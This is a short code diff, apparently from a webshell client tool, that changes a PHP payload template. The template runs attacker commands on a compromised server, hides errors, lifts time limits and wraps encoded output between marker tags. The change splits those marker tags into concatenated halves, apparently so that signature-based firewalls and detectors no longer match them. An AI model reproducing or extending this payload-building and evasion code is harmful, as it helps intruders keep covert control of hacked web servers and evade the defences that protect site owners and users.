@@ -35,7 +35,7 @@ class PHP4 extends PHP {
     }
     // 组合完整的代码
     let tmpCode = data['_'];
-    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s}";echo @asenc($output);echo "${tag_e}";}ob_start();${tmpCode};asoutput();die();`;
+    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();${tmpCode};asoutput();die();`;
 
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
